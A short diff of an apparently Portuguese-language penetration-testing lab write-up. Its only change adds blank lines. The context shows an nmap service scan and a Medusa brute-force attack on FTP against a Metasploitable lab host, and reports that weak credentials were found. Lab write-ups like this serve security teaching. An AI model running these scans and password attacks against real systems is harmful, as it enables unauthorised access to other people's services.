@@ -34,6 +34,8 @@ nmap -sV -p 21,22,80,445,139 192.168.56.101
 
 # Ataque de força bruta ao serviço FTP com Medusa
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
+
+
 📎 Resultados
 
 Foi possível obter acesso válido ao serviço FTP utilizando a ferramenta Medusa, evidenciando o uso de credenciais fracas no ambiente Metasploitable.
